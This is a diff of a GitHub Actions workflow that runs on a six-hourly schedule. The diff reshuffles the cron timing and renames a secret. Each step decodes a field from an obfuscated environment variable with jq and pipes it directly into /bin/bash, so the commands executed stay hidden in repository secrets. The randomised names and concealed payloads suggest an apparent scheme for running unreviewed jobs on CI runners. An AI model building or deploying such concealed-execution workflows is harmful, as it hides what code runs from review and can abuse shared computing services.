@@ -2,24 +2,24 @@ name: lieyixia
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 1/6 * * *'
+    - cron: '36 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: lieyixia
         env:
-          bsrag89: ${{ secrets.bsrag89 }}
+          pugh6538: ${{ secrets.pugh6538 }}
         run: |
-          echo $bsrag89 | jq -r .v7 | /bin/bash
-          echo $byu617 | jq -r .qtrrd55476 | /bin/bash
-          echo $m9 | jq -r .ly15 | /bin/bash
-          echo $yr23 | jq -r .polrg129 | /bin/bash
-          echo $atse2583 | jq -r .nzw7 | /bin/bash
-          echo $pt04029 | jq -r .dxui13515 | /bin/bash
-          echo $m876 | jq -r .bir07 | /bin/bash
-          echo $mafa0 | jq -r .ioqzx1 | /bin/bash
-          echo $lodz5 | jq -r .srwt7569 | /bin/bash
+          echo $pugh6538 | jq -r .hkr92 | /bin/bash
+          echo $hx9737 | jq -r .b03946 | /bin/bash
+          echo $p31023 | jq -r .vods461 | /bin/bash
+          echo $k0994 | jq -r .c055 | /bin/bash
+          echo $dz392 | jq -r .yspt8 | /bin/bash
+          echo $w03 | jq -r .fp7 | /bin/bash
+          echo $gw959 | jq -r .g38 | /bin/bash
+          echo $lzc71823 | jq -r .pjy36139 | /bin/bash
 
